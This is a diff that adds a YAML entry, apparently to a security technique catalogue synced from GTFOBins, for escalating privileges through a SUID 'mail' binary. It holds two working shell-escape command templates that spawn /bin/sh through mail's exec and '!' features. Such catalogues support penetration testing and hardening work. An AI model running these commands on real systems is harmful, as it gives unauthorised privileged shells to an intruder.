@@ -1,0 +1,27 @@
+id: gtfobins/mail/shell/suid
+type: binary
+platform: linux
+name: mail
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: mail --exec='!/bin/sh'
+- template: 'mail -f /etc/hosts
+
+    !/bin/sh'
+references:
+- https://gtfobins.github.io/gtfobins/mail/
+tags:
+- linux
+- unix
+- gtfobins
